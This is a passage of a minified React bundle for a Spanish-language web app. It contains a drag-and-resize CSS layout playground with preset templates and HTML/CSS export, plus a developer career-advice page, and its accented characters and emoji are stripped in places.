Frame"},{x:405,y:30,width:390,height:45,bgColor:"#1e293b",borderRadius:0,opacity:1,rotation:0,zIndex:2,label:"Status Bar"},{x:405,y:82,width:390,height:75,bgColor:"#1e293b",borderRadius:0,opacity:1,rotation:0,zIndex:2,label:"App Bar"},{x:420,y:172,width:360,height:180,bgColor:"#10b981",borderRadius:14,opacity:.8,rotation:0,zIndex:2,label:"Banner"},{x:420,y:367,width:172,height:120,bgColor:"#1e293b",borderRadius:12,opacity:1,rotation:0,zIndex:2,label:"Widget 1"},{x:607,y:367,width:172,height:120,bgColor:"#1e293b",borderRadius:12,opacity:1,rotation:0,zIndex:2,label:"Widget 2"},{x:420,y:502,width:360,height:75,bgColor:"#1e293b",borderRadius:10,opacity:1,rotation:0,zIndex:2,label:"List Item 1"},{x:420,y:585,width:360,height:75,bgColor:"#1e293b",borderRadius:10,opacity:1,rotation:0,zIndex:2,label:"List Item 2"},{x:405,y:667,width:390,height:45,bgColor:"#1e293b",borderRadius:0,opacity:1,rotation:0,zIndex:2,label:"Bottom Nav"}]},{name:"Tablero Kanban",icon:"",boxes:[{x:15,y:15,width:1170,height:60,bgColor:"#1e293b",borderRadius:8,opacity:1,rotation:0,zIndex:1,label:"Board Header"},{x:15,y:90,width:375,height:600,bgColor:"#111827",borderRadius:12,opacity:1,rotation:0,zIndex:1,label:"Col Todo"},{x:30,y:105,width:345,height:37,bgColor:"#ef4444",borderRadius:6,opacity:.3,rotation:0,zIndex:2,label:"Todo Header"},{x:30,y:157,width:345,height:90,bgColor:"#1e293b",borderRadius:8,opacity:1,rotation:0,zIndex:2,label:"Task 1"},{x:30,y:262,width:345,height:90,bgColor:"#1e293b",borderRadius:8,opacity:1,rotation:0,zIndex:2,label:"Task 2"},{x:30,y:367,width:345,height:90,bgColor:"#1e293b",borderRadius:8,opacity:1,rotation:0,zIndex:2,label:"Task 3"},{x:405,y:90,width:375,height:600,bgColor:"#111827",borderRadius:12,opacity:1,rotation:0,zIndex:1,label:"Col In Progress"},{x:420,y:105,width:345,height:37,bgColor:"#f59e0b",borderRadius:6,opacity:.3,rotation:0,zIndex:2,label:"Progress Header"},{x:420,y:157,width:345,height:90,bgColor:"#1e293b",borderRadius:8,opacity:1,rotation:0,zIndex:2,label:"Task 4"},{x:420,y:262,width:345,height:90,bgColor:"#1e293b",borderRadius:8,opacity:1,rotation:0,zIndex:2,label:"Task 5"},{x:795,y:90,width:375,height:600,bgColor:"#111827",borderRadius:12,opacity:1,rotation:0,zIndex:1,label:"Col Done"},{x:810,y:105,width:345,height:37,bgColor:"#34d399",borderRadius:6,opacity:.3,rotation:0,zIndex:2,label:"Done Header"},{x:810,y:157,width:345,height:90,bgColor:"#1e293b",borderRadius:8,opacity:1,rotation:0,zIndex:2,label:"Task 6"}]},{name:"Pgina de Inicio",icon:"",boxes:[{x:30,y:7,width:1140,height:67,bgColor:"#0f172a",borderRadius:10,opacity:1,rotation:0,zIndex:3,label:"Top Nav"},{x:30,y:82,width:1140,height:270,bgColor:"#1e293b",borderRadius:16,opacity:1,rotation:0,zIndex:1,label:"Hero Banner"},{x:75,y:135,width:450,height:52,bgColor:"transparent",borderRadius:0,opacity:1,rotation:0,zIndex:2,label:"Headline"},{x:75,y:202,width:375,height:30,bgColor:"transparent",borderRadius:0,opacity:.5,rotation:0,zIndex:2,label:"Subheadline"},{x:75,y:262,width:180,height:57,bgColor:"#10b981",borderRadius:8,opacity:1,rotation:0,zIndex:2,label:"Get Started"},{x:900,y:105,width:240,height:225,bgColor:"#334155",borderRadius:12,opacity:.7,rotation:0,zIndex:2,label:"Hero Image"},{x:30,y:375,width:360,height:180,bgColor:"#1e293b",borderRadius:12,opacity:1,rotation:0,zIndex:1,label:"Feature 1"},{x:420,y:375,width:360,height:180,bgColor:"#1e293b",borderRadius:12,opacity:1,rotation:0,zIndex:1,label:"Feature 2"},{x:810,y:375,width:360,height:180,bgColor:"#1e293b",borderRadius:12,opacity:1,rotation:0,zIndex:1,label:"Feature 3"},{x:300,y:585,width:600,height:90,bgColor:"#0f172a",borderRadius:12,opacity:1,rotation:0,zIndex:1,label:"CTA Section"},{x:450,y:607,width:300,height:48,bgColor:"#818cf8",borderRadius:8,opacity:1,rotation:0,zIndex:2,label:"Sign Up Free"}]},{name:"Configuracin",icon:"",boxes:[{x:30,y:15,width:300,height:660,bgColor:"#0f172a",borderRadius:12,opacity:1,rotation:0,zIndex:1,label:"Settings Menu"},{x:45,y:30,width:270,height:45,bgColor:"transparent",borderRadius:0,opacity:1,rotation:0,zIndex:2,label:"Settings Title"},{x:45,y:90,width:270,height:54,bgColor:"#10b981",borderRadius:8,opacity:.15,rotation:0,zIndex:2,label:"General Active"},{x:45,y:153,width:270,height:54,bgColor:"transparent",borderRadius:8,opacity:.6,rotation:0,zIndex:2,label:"Security"},{x:45,y:216,width:270,height:54,bgColor:"transparent",borderRadius:8,opacity:.6,rotation:0,zIndex:2,label:"Notifications"},{x:45,y:279,width:270,height:54,bgColor:"transparent",borderRadius:8,opacity:.6,rotation:0,zIndex:2,label:"Billing"},{x:345,y:15,width:825,height:660,bgColor:"#1e293b",borderRadius:12,opacity:1,rotation:0,zIndex:1,label:"Content Area"},{x:375,y:45,width:300,height:37,bgColor:"transparent",borderRadius:0,opacity:1,rotation:0,zIndex:2,label:"Section Title"},{x:375,y:112,width:765,height:66,bgColor:"#334155",borderRadius:8,opacity:1,rotation:0,zIndex:2,label:"Input Name"},{x:375,y:202,width:765,height:66,bgColor:"#334155",borderRadius:8,opacity:1,rotation:0,zIndex:2,label:"Input Email"},{x:375,y:292,width:765,height:66,bgColor:"#334155",borderRadius:8,opacity:1,rotation:0,zIndex:2,label:"Input Bio"},{x:945,y:390,width:195,height:60,bgColor:"#10b981",borderRadius:8,opacity:1,rotation:0,zIndex:2,label:"Save Changes"}]}],zi=1200,Ui=1200;let B5=0;const Dc=()=>`box-${++B5}-${Date.now()}`,mo=(a,e)=>Math.round(a/e*1e4)/100,cp=(a,e)=>Math.round(a/100*e),V5=()=>{const[a,e]=F.useState([{id:Dc(),x:60,y:60,width:200,height:150,bgColor:"#10b981",borderRadius:12,opacity:1,rotation:0,zIndex:1,label:"Box 1"},{id:Dc(),x:300,y:100,width:160,height:120,bgColor:"#818cf8",borderRadius:8,opacity:1,rotation:0,zIndex:2,label:"Box 2"}]),[t,o]=F.useState(new Set),[r,l]=F.useState(null),[c,d]=F.useState(null),[f,p]=F.useState(""),[v,y]=F.useState(!1),[S,A]=F.useState(!1),[R,L]=F.useState(!1),[x,D]=F.useState(!1),[G,B]=F.useState(!1),[ee,ue]=F.useState(!1),[Q,w]=F.useState("row"),[I,k]=F.useState("nowrap"),[j,_]=F.useState("flex-start"),[z,N]=F.useState("flex-start"),[ge,me]=F.useState("flex-start"),[K,pe]=F.useState(10),[ye,Me]=F.useState(""),[U,H]=F.useState(""),[oe,M]=F.useState(""),[ve,je]=F.useState(""),[Ae,Oe]=F.useState("10"),sa=F.useRef(null),ta=t.size>0?Array.from(t)[t.size-1]:null,Pe=ta&&a.find(O=>O.id===ta)||null;F.useEffect(()=>{Pe&&(Me((x?mo(Pe.x,zi):Pe.x).toString()),H((x?mo(Pe.y,Ui):Pe.y).toString()),M((x?mo(Pe.width,zi):Pe.width).toString()),je((x?mo(Pe.height,Ui):Pe.height).toString()))},[Pe?.id,x,Pe?.x,Pe?.y,Pe?.width,Pe?.height]),F.useEffect(()=>{Oe(K.toString())},[K]);const Pt=(O,Z)=>{o(fe=>{const le=new Set(Z?fe:[]);return le.has(O)&&Z?le.delete(O):le.add(O),le})},Vn=(O,Z)=>{if(O.stopPropagation(),O.target.classList.contains("resize-handle"))return;const fe=O.ctrlKey||O.shiftKey||O.metaKey;!fe&&!t.has(Z.id)?o(new Set([Z.id])):Pt(Z.id,fe);const le=sa.current?.getBoundingClientRect();if(!le)return;const Se=t.has(Z.id)?t:new Set([...t,Z.id]),pa=new Map;a.forEach(Ta=>{Se.has(Ta.id)&&pa.set(Ta.id,{x:Ta.x,y:Ta.y})}),l({id:Z.id,offsetX:O.clientX-le.left-Z.x,offsetY:O.clientY-le.top-Z.y,snapshots:pa})},Fn=(O,Z)=>{O.stopPropagation(),O.preventDefault(),t.has(Z.id)||o(new Set([Z.id]));const fe=t.has(Z.id)?t:new Set([...t,Z.id]),le=new Map;a.forEach(Se=>{fe.has(Se.id)&&le.set(Se.id,{x:Se.x,y:Se.y,w:Se.width,h:Se.height})}),d({id:Z.id,startX:O.clientX,startY:O.clientY,snapshots:le})},ht=F.useCallback(O=>{if(r){const Z=sa.current?.getBoundingClientRect();if(!Z)return;const fe=r.snapshots.get(r.id);if(!fe)return;const le=O.clientX-Z.left-r.offsetX,Se=O.clientY-Z.top-r.offsetY,pa=le-fe.x,Ta=Se-fe.y;e(ea=>ea.map(ra=>{const qa=r.snapshots.get(ra.id);return qa?{...ra,x:Math.max(0,Math.round(qa.x+pa)),y:Math.max(0,Math.round(qa.y+Ta))}:ra}))}if(c){const Z=O.clientX-c.startX,fe=O.clientY-c.startY,le=c.snapshots.get(c.id);if(!le)return;const Se=le.w>0?(le.w+Z)/le.w:1,pa=le.h>0?(le.h+fe)/le.h:1;e(Ta=>Ta.map(ea=>{const ra=c.snapshots.get(ea.id);if(!ra)return ea;const qa=ra.x-le.x,He=ra.y-le.y;return{...ea,x:Math.max(0,Math.round(le.x+qa*Se)),y:Math.max(0,Math.round(le.y+He*pa)),width:Math.max(30,Math.round(ra.w*Se)),height:Math.max(30,Math.round(ra.h*pa))}}))}},[r,c]),an=F.useCallback(()=>{l(null),d(null)},[]);F.useEffect(()=>(window.addEventListener("mousemove",ht),window.addEventListener("mouseup",an),()=>{window.removeEventListener("mousemove",ht),window.removeEventListener("mouseup",an)}),[ht,an]);const tn=()=>{const O={id:Dc(),x:40+Math.random()*200,y:40+Math.random()*200,width:120+Math.round(Math.random()*100),height:80+Math.round(Math.random()*80),bgColor:ug[Math.floor(Math.random()*ug.length)],borderRadius:8,opacity:1,rotation:0,zIndex:a.length+1,label:`Box ${a.length+1}`};e(Z=>[...Z,O]),o(new Set([O.id]))},Hn=O=>{e(Z=>Z.filter(fe=>fe.id!==O)),o(Z=>{const fe=new Set(Z);return fe.delete(O),fe})},Ao=O=>{const Z=a.find(le=>le.id===O);if(!Z)return;const fe={...Z,id:Dc(),x:Z.x+20,y:Z.y+20,label:Z.label+" (copy)"};e(le=>[...le,fe]),o(new Set([fe.id]))},Fe=(O,Z)=>{e(fe=>fe.map(le=>le.id===O?{...le,...Z}:le))},ia=O=>{e(Z=>Z.map(fe=>t.has(fe.id)?{...fe,...O}:fe))},Ut=(O,Z,fe)=>{const le=a.find(Ta=>Ta.id===O);if(!le||le.width===0&&le.height===0)return;const Se=Z/le.width,pa=fe/le.height;e(Ta=>Ta.map(ea=>ea.id===O?{...ea,width:Math.round(Z),height:Math.round(fe)}:{...ea,x:Math.round(ea.x*Se),y:Math.round(ea.y*pa),width:Math.max(30,Math.round(ea.width*Se)),height:Math.max(30,Math.round(ea.height*pa))}))},sr=()=>{e([]),o(new Set)},ii=O=>{const Z=O.boxes.map(fe=>({...fe,id:Dc()}));e(Z),o(new Set)},Ua=F.useCallback(()=>{let O=`<div class="container">
`;const Z=x?"100%":`${zi}px`,fe=x?"100%":`${Ui}px`;let le=`.container {
`;le+=`  width: ${Z};
`,le+=`  height: ${fe};
`,le+=`  background: #0a0a0a;
`,le+=`  border-radius: 12px;
`,le+=`  overflow: hidden;
`,ee?(le+=`  display: flex;
`,le+=`  flex-direction: ${Q};
`,le+=`  flex-wrap: ${I};
`,le+=`  justify-content: ${j};
`,le+=`  align-items: ${z};
`,I!=="nowrap"&&(le+=`  align-content: ${ge};
`),le+=`  gap: ${K}px;
`,le+=`  padding: 20px;
`):le+=`  position: relative;
`,le+=`}

`,a.forEach(Se=>{const pa=Se.label.toLowerCase().replace(/[^a-z0-9]/g,"-").replace(/-+/g,"-");O+=`  <div class="${pa}"></div>
`,le+=`.${pa} {
`,ee||(le+=`  position: absolute;
`,x?(le+=`  left: ${mo(Se.x,zi)}%;
`,le+=`  top: ${mo(Se.y,Ui)}%;
`):(le+=`  left: ${Se.x}px;
`,le+=`  top: ${Se.y}px;
`)),x?(le+=`  width: ${mo(Se.width,zi)}%;
`,le+=`  height: ${mo(Se.height,Ui)}%;
`):(le+=`  width: ${Se.width}px;
`,le+=`  height: ${Se.height}px;
`),le+=`  background-color: ${Se.bgColor};
`,Se.borderRadius>0&&(le+=`  border-radius: ${Se.borderRadius}px;
`),Se.opacity<1&&(le+=`  opacity: ${Se.opacity};
`),Se.rotation!==0&&(le+=`  transform: rotate(${Se.rotation}deg);
`),le+=`  z-index: ${Se.zIndex};
`,le+=`  flex-shrink: 0;
`,le+=`}

`}),O+="</div>",p(`/* === HTML === */
${O}

/* === CSS === */
${le}`)},[a,x,ee,Q,I,j,z,ge,K]);F.useEffect(()=>{Ua()},[Ua]);const nn=()=>{navigator.clipboard.writeText(f),y(!0),setTimeout(()=>y(!1),2e3)};return g.jsxs("div",{className:"divplayground-root",children:[g.jsxs("header",{className:"divplayground-header",children:[g.jsx("div",{className:"divplayground-title-row",children:g.jsxs("h1",{className:"divplayground-title",children:[g.jsx("span",{className:"divplayground-tag",children:"<div>"}),g.jsx("span",{className:"divplayground-subtitle",children:"CSS Visual Playground"})]})}),g.jsxs("div",{className:"divplayground-actions",children:[g.jsx("button",{className:`dp-btn ${G?"dp-btn-active":"dp-btn-ghost"}`,onClick:()=>B(!G),title:"Escalar todas las cajas proporcionalmente",children:G?g.jsxs(g.Fragment,{children:[g.jsx(bN,{size:16})," Proporcional"]}):g.jsxs(g.Fragment,{children:[g.jsx(jN,{size:16})," Libre"]})}),g.jsxs("button",{className:"dp-btn dp-btn-danger",onClick:sr,children:[g.jsx(Y1,{size:16})," Limpiar"]})]})]}),S&&g.jsx("div",{className:"presets-bar animate-slide-down",children:U5.map(O=>g.jsx("button",{className:"preset-chip",onClick:()=>ii(O),children:g.jsx("span",{children:O.name})},O.name))}),g.jsxs("div",{className:"divplayground-workspace",children:[g.jsxs("div",{className:"dp-editor-panel animate-slide-right",children:[g.jsx("div",{className:"dp-editor-section",children:g.jsxs("div",{style:{display:"flex",gap:"0.5rem",marginBottom:"0.5rem"},children:[g.jsxs("button",{className:"dp-btn dp-btn-primary w-full justify-center",onClick:tn,children:[g.jsx(AN,{size:16})," Nueva caja"]}),g.jsx("button",{className:`dp-btn w-full justify-center ${S?"dp-btn-active":"dp-btn-ghost"}`,onClick:()=>A(!S),children:S?g.jsxs(g.Fragment,{children:[g.jsx(oj,{size:16})," Cerrar"]}):g.jsxs(g.Fragment,{children:[g.jsx(Br,{size:16})," Plantillas"]})})]})}),g.jsxs("div",{className:"dp-editor-section",style:{borderLeft:ee?"2px solid #10b981":"none",paddingLeft:ee?"0.75rem":"0"},children:[g.jsx("h3",{className:"dp-editor-title",children:"Layout del Canvas"}),g.jsxs("div",{className:"dp-property-grid",children:[g.jsx("label",{children:"Modo"}),g.jsx("button",{className:`dp-btn dp-btn-xs ${ee?"dp-btn-active":"dp-btn-ghost"}`,onClick:()=>ue(!ee),style:{width:"100%",justifyContent:"center"},children:ee?g.jsxs(g.Fragment,{children:[g.jsx(Br,{size:12})," Flexbox"]}):g.jsxs(g.Fragment,{children:[g.jsx(Ug,{size:12})," Absoluto"]})}),ee&&g.jsxs(g.Fragment,{children:[g.jsx("div",{style:{gridColumn:"1/-1",height:"1px",background:"rgba(255,255,255,0.05)",margin:"0.25rem 0"}}),g.jsx("label",{children:"Direccin"}),g.jsxs("select",{value:Q,onChange:O=>w(O.target.value),className:"dp-select",children:[g.jsx("option",{value:"row",children:"Horizontal (Row)"}),g.jsx("option",{value:"row-reverse",children:"Horizontal Inv."}),g.jsx("option",{value:"column",children:"Vertical (Column)"}),g.jsx("option",{value:"column-reverse",children:"Vertical Inv."})]}),g.jsx("label",{children:"Envolver (Wrap)"}),g.jsxs("select",{value:I,onChange:O=>k(O.target.value),className:"dp-select",children:[g.jsx("option",{value:"nowrap",children:"No Wrap"}),g.jsx("option",{value:"wrap",children:"Wrap"}),g.jsx("option",{value:"wrap-reverse",children:"Wrap Reverse"})]}),g.jsx("label",{children:"Justificar"}),g.jsxs("select",{value:j,onChange:O=>_(O.target.value),className:"dp-select",children:[g.jsx("option",{value:"flex-start",children:"Inicio"}),g.jsx("option",{value:"center",children:"Centro"}),g.jsx("option",{value:"flex-end",children:"Fin"}),g.jsx("option",{value:"space-between",children:"Espaciado (Between)"}),g.jsx("option",{value:"space-around",children:"Espaciado (Around)"}),g.jsx("option",{value:"space-evenly",children:"Espaciado (Evenly)"})]}),g.jsx("label",{children:"Alinear Items"}),g.jsxs("select",{value:z,onChange:O=>N(O.target.value),className:"dp-select",children:[g.jsx("option",{value:"flex-start",children:"Inicio"}),g.jsx("option",{value:"center",children:"Centro"}),g.jsx("option",{value:"flex-end",children:"Fin"}),g.jsx("option",{value:"baseline",children:"Lnea base"}),g.jsx("option",{value:"stretch",children:"Estirar (Stretch)"})]}),I!=="nowrap"&&g.jsxs(g.Fragment,{children:[g.jsx("label",{children:"Alinear Cont."}),g.jsxs("select",{value:ge,onChange:O=>me(O.target.value),className:"dp-select",children:[g.jsx("option",{value:"flex-start",children:"Inicio"}),g.jsx("option",{value:"center",children:"Centro"}),g.jsx("option",{value:"flex-end",children:"Fin"}),g.jsx("option",{value:"space-between",children:"Between"}),g.jsx("option",{value:"space-around",children:"Around"}),g.jsx("option",{value:"stretch",children:"Stretch"})]})]}),g.jsx("label",{children:"Espacio (Gap)"}),g.jsx("input",{type:"number",value:Ae,onChange:O=>{Oe(O.target.value),O.target.value!==""&&pe(+O.target.value)},style:{padding:"0.4rem"}})]})]})]}),g.jsxs("div",{className:"dp-editor-section",children:[g.jsxs("h3",{className:"dp-editor-title",children:["Capas ",t.size>1&&g.jsxs("span",{className:"dp-unit-badge",children:[t.size," sel."]})]}),g.jsx("div",{className:"dp-layers",children:a.map(O=>g.jsxs("div",{className:`dp-layer ${t.has(O.id)?"dp-layer-active":""}`,onClick:Z=>Pt(O.id,Z.ctrlKey||Z.shiftKey||Z.metaKey),children:[g.jsx("span",{className:"dp-layer-color",style:{background:O.bgColor}}),g.jsx("span",{className:"dp-layer-name",children:O.label}),g.jsxs("div",{className:"dp-layer-actions",children:[g.jsx("button",{onClick:Z=>{Z.stopPropagation(),Ao(O.id)},title:"Duplicar",children:g.jsx(Gc,{size:14})}),g.jsx("button",{onClick:Z=>{Z.stopPropagation(),Hn(O.id)},title:"Eliminar",children:g.jsx(Y1,{size:14})})]})]},O.id))})]}),Pe&&g.jsxs("div",{className:"dp-editor-section",children:[g.jsxs("h3",{className:"dp-editor-title",children:["Propiedades ",t.size>1&&g.jsxs("span",{className:"dp-unit-badge",children:[t.size," cajas"]}),x&&g.jsx("span",{className:"dp-unit-badge",children:"%"})]}),g.jsxs("div",{className:"dp-props-grid",children:[g.jsx("label",{children:"Label"}),g.jsx("input",{type:"text",value:Pe.label,onChange:O=>Fe(Pe.id,{label:O.target.value})}),g.jsxs("label",{children:["X ",x?"%":"px"]}),g.jsx("input",{type:"number",step:x?.5:1,value:ye,onChange:O=>{Me(O.target.value),O.target.value!==""&&Fe(Pe.id,{x:x?cp(+O.target.value,zi):+O.target.value})}}),g.jsxs("label",{children:["Y ",x?"%":"px"]}),g.jsx("input",{type:"number",step:x?.5:1,value:U,onChange:O=>{H(O.target.value),O.target.value!==""&&Fe(Pe.id,{y:x?cp(+O.target.value,Ui):+O.target.value})}}),g.jsx("label",{children:"Ancho"}),g.jsxs("div",{style:{display:"flex",gap:"0.4rem"},children:[g.jsx("input",{type:"number",step:x?.5:1,style:{flex:1},value:oe,onChange:O=>{if(M(O.target.value),O.target.value!==""){const Z=+O.target.value,fe=x?cp(Z,zi):Z;G?Ut(Pe.id,fe,Pe.height):t.size>1?ia({width:fe}):Fe(Pe.id,{width:fe})}}}),g.jsx("button",{className:`dp-btn dp-btn-xs ${x?"dp-btn-active":"dp-btn-ghost"}`,onClick:()=>D(!x),children:"%"})]}),g.jsx("label",{children:"Alto"}),g.jsxs("div",{style:{display:"flex",gap:"0.4rem"},children:[g.jsx("input",{type:"number",step:x?.5:1,style:{flex:1},value:ve,onChange:O=>{if(je(O.target.value),O.target.value!==""){const Z=+O.target.value,fe=x?cp(Z,Ui):Z;G?Ut(Pe.id,Pe.width,fe):t.size>1?ia({height:fe}):Fe(Pe.id,{height:fe})}}}),g.jsx("button",{className:`dp-btn dp-btn-xs ${x?"dp-btn-active":"dp-btn-ghost"}`,onClick:()=>D(!x),children:"%"})]}),g.jsx("label",{children:"Color"}),g.jsxs("div",{className:"dp-color-row",children:[g.jsx("input",{type:"color",value:Pe.bgColor==="transparent"?"#000000":Pe.bgColor,onChange:O=>{t.size>1?ia({bgColor:O.target.value}):Fe(Pe.id,{bgColor:O.target.value})},title:"Seleccionar color"}),g.jsx("input",{type:"text",value:Pe.bgColor,className:"dp-hex-input",placeholder:"#hex",onChange:O=>{const Z=O.target.value;t.size>1?ia({bgColor:Z}):Fe(Pe.id,{bgColor:Z})},title:"Color Hex"}),g.jsx("div",{className:"dp-color-swatches",children:ug.map(O=>g.jsx("button",{className:"dp-swatch",style:{background:O},onClick:()=>{t.size>1?ia({bgColor:O}):Fe(Pe.id,{bgColor:O})}},O))})]}),g.jsx("label",{children:"Border-Radius"}),g.jsx("input",{type:"range",min:0,max:100,value:Pe.borderRadius,onChange:O=>{t.size>1?ia({borderRadius:+O.target.value}):Fe(Pe.id,{borderRadius:+O.target.value})}}),g.jsx("label",{children:"Opacidad"}),g.jsx("input",{type:"range",min:0,max:100,value:Math.round(Pe.opacity*100),onChange:O=>{t.size>1?ia({opacity:+O.target.value/100}):Fe(Pe.id,{opacity:+O.target.value/100})}}),g.jsx("label",{children:"Rotacin"}),g.jsx("input",{type:"range",min:-180,max:180,value:Pe.rotation,onChange:O=>{t.size>1?ia({rotation:+O.target.value}):Fe(Pe.id,{rotation:+O.target.value})}}),g.jsx("label",{children:"Z-Index"}),g.jsx("input",{type:"number",value:Pe.zIndex,onChange:O=>{t.size>1?ia({zIndex:+O.target.value}):Fe(Pe.id,{zIndex:+O.target.value})}}),g.jsx("div",{style:{gridColumn:"1 / -1",marginTop:"0.5rem"},children:g.jsxs("button",{className:"dp-btn dp-btn-ghost w-full justify-center",style:{fontSize:"0.75rem"},onClick:()=>{const O={opacity:1,rotation:0,borderRadius:0};t.size>1?ia(O):Fe(Pe.id,O)},children:[g.jsx(TN,{size:14})," Normalizar Estilos"]})})]})]}),g.jsx("div",{className:"dp-editor-section",children:R?g.jsxs(g.Fragment,{children:[g.jsxs("div",{className:"dp-export-header",children:[g.jsx("h3",{className:"dp-editor-title",children:"Cdigo CSS"}),g.jsx("button",{className:`dp-btn dp-btn-copy ${v?"copied":""}`,onClick:nn,children:v?g.jsxs(g.Fragment,{children:[g.jsx(Gc,{size:14})," Copiado"]}):g.jsxs(g.Fragment,{children:[g.jsx(Gc,{size:14})," Re-copiar"]})})]}),g.jsx("pre",{className:"dp-code-output",children:f}),g.jsx("button",{className:"dp-btn dp-btn-ghost w-full mt-3 justify-center",style:{width:"100%",marginTop:"0.75rem",fontSize:"0.75rem"},onClick:()=>L(!1),children:"Ocultar cdigo"})]}):g.jsxs("button",{className:"dp-btn dp-btn-primary w-full justify-center",style:{width:"100%",padding:"0.85rem"},onClick:()=>{nn(),L(!0)},children:[g.jsx(fN,{size:18})," Copiar cdigo"]})})]}),g.jsx("div",{className:"dp-canvas-wrapper",children:g.jsx("div",{className:`dp-canvas ${ee?"is-flex":""}`,ref:sa,onClick:()=>o(new Set),style:ee?{display:"flex",flexDirection:Q,flexWrap:I,justifyContent:j,alignItems:z,alignContent:ge,gap:`${K}px`,padding:"20px"}:{},children:a.map(O=>g.jsxs("div",{className:`dp-box ${t.has(O.id)?"dp-box-selected":""}`,style:{position:ee?"relative":"absolute",left:ee?void 0:O.x,top:ee?void 0:O.y,width:O.width,height:O.height,backgroundColor:O.bgColor,borderRadius:O.borderRadius,opacity:O.opacity,transform:O.rotation?`rotate(${O.rotation}deg)`:void 0,zIndex:O.zIndex,border:O.bgColor==="transparent"?"1px dashed rgba(255,255,255,0.25)":"1px solid rgba(255,255,255,0.15)",flexShrink:0},onMouseDown:Z=>Vn(Z,O),onClick:Z=>Z.stopPropagation(),children:[g.jsx("span",{className:"dp-box-label",children:O.label}),g.jsx("span",{className:"dp-box-dims",children:x?`${mo(O.width,zi)}%  ${mo(O.height,Ui)}%`:`${O.width}${O.height}`}),g.jsx("div",{className:"resize-handle",onMouseDown:Z=>Fn(Z,O)})]},O.id))})})]})]})},F5=()=>{const[a,e]=F.useState("junior"),t={junior:{title:"Nivel Junior: Cimentando las Bases",description:"En esta etapa, tu mayor activo es la curiosidad y la capacidad de aprender rpido. No te preocupes por saberlo todo, preocpate por entender cmo funcionan las cosas por debajo.",tips:[{icon:"",title:"Domina los Fundamentos",text:"Antes que los frameworks, aprende bien el lenguaje base. Si vas por web, domina JavaScript vanilla, no solo React. Entiende estructuras de datos y algoritmos bsicos."},{icon:"",title:"Construye Proyectos Reales",text:"Deja de hacer tutoriales paso a paso (Tutorial Hell). Empieza un proyecto desde cero, rompe cosas y arrglalas. Eso es lo que realmente te ensea."},{icon:"",title:"Portfolio Estratgico",text:"No necesitas 20 proyectos mediocres. Necesitas 3 excelentes. Documenta el proceso, los retos que enfrentaste y cmo los solucionaste."},{icon:"",title:"English is Key",text:"La documentacin ms reciente y los mejores recursos estn en ingls. Incluso un nivel tcnico bsico te abrir puertas globales."}]},semisenior:{title:"Nivel Semi-Senior: Especializacin y Autonoma",description:"Ya sabes construir piezas. Ahora es el momento de aprender a construir sistemas. Esta etapa se trata de profundidad tcnica y de empezar a influir en el equipo.",tips:[{icon:"",title:"Elige tu Especialidad",text:"Conoce un poco de todo (T-shaped profile), pero profundiza seriamente en un rea. S la persona a la que todos acuden cuando hay un problema complejo en X tecnologa."},{icon:"",title:"Clean Code & Testing",text:"No basta con que el cdigo funcione. Debe ser mantenible. Aprende patrones de diseo, principios SOLID y haz que el testing sea parte innegociable de tu workflow."},{icon:"",title:"Soft Skills (Habilidades Humanas)",text:"La programacin es un deporte de equipo. Aprende a comunicar ideas tcnicas de forma sencilla, a dar buen feedback y a gestionar tu tiempo eficientemente."},{icon:"",title:"Entiende el Negocio",text:"Empieza a preguntar 'Por qu estamos construyendo esto?'. Un desarrollador que entiende el valor de negocio de su trabajo es mucho ms valioso."}]},senior:{title:"Nivel Senior: Impacto y Arquitectura",description:"Ser Senior no es solo escribir cdigo complejo; es tomar decisiones que ahorren meses de trabajo y elevar el nivel de quienes te rodean.",tips:[{icon:"",title:"Pensamiento de Sistemas",text:"Aprende arquitectura de software. Entiende los tradeoffs (ventajas y desventajas) de cada decisin. No hay 'mejores' soluciones, solo soluciones que encajan mejor en un contexto."},{icon:"",title:"Mentoring & Liderazgo",text:"Tu xito se mide por el crecimiento de tu equipo. Dedica tiempo a revisar cdigo con paciencia, a mentorizar juniors y a documentar conocimiento crtico."},{icon:"",title:"Estratega de la Pragmtica",text:"A veces la mejor solucin es no escribir cdigo. Aprende a identificar cundo una herramienta de terceros es mejor que construir algo in-house."},{icon:"",title:"Legacy & Estndares",text:"Preocpate por la escalabilidad a largo plazo y la seguridad. Define estndares que sobrevivan a tu paso por la empresa."}]}};return g.jsxs("div",{className:"career-container animate-fade-in",children:[g.jsxs("section",{className:"career-hero",children:[g.jsx("span",{className:"career-badge",children:"Gua de Carrera"}),g.jsx("h1",{className:"career-title",children:"Consejos para el xito Profesional"}),g.jsx("p",{className:"career-subtitle",children:"Navega por las distintas etapas de tu evolucin como desarrollador. Desde tu primera lnea de cdigo hasta el liderazgo tcnico."})]}),g.jsxs("div",{className:"level-nav",children:[g.jsxs("button",{className:`level-tab ${a==="junior"?"active":""}`,onClick:()=>e("junior"),children:[g.jsx("span",{className:"tab-icon",children:""}),"Junior"]}),g.jsxs("button",{className:`level-tab ${a==="semisenior"?"active":""}`,onClick:()=>e("semisenior"),children:[g.jsx("span",{className:"tab-icon",children:""}),"Semi-Senior"]}),g.jsxs("button",{className:`level-tab ${a==="senior"?"active":""}`,onClick:()=>e("senior"),children:[g.jsx("span",{className:"tab-icon",children:""}),"Senior"]})]}),g.jsxs("div",{className:"advice-content glass-effect",children:[g.jsxs("div",{className:"advice-header",children:[g.jsx("h2",{children:t[a].title}),g.jsx("p",{children:t[a].description})]}),g.jsx("div",{className:"tips-grid",children:t[a].tips.map((o,r)=>g.jsxs("div",{className:"tip-card",children:[g.jsx("div",{className:"tip-icon-wrapper",children:g.jsx("span",{className:"tip-icon",children:o.icon})}),g.jsx("h3",{children:o.title}),g.jsx("p",{children:o.text})]},r))})]}),g.jsxs("section",{className:"general-resources",children:[g.jsx("h3",{children:"Habilidades Crticas"}),g.jsxs("div",{className:"resources-grid",children:[g.jsxs("div",{className:"res-card",children:[g.jsx("h4",{children:"La Regla de los 15 Minutos"}),g.jsx("p",{children:"Si te quedas atascado, intenta resolverlo por ti mismo durante 15 minutos. Si no puedes, pide ayuda. No esperes horas, pero tampoco preguntes al primer minuto."})]}),g.jsxs("div",{className:"res-card",children:[g.jsx("h4",{children:"Comunicacin Asncrona"}),g.jsx("p",{children:"En trabajo remoto, saber escribir tickets, mensajes de Slack y documentacin clara vale ms que saber 10 lenguajes diferentes."})]}),g.jsxs("div",{className:"res-card",children:[g.jsx("h4",{children:"La Curiosidad vs El Ego"}),g.jsx("p",{children:"Nunca seas la persona ms inteligente del equipo. Si lo eres, ests en el lugar equivocado. Mantn siempre la mentalidad de 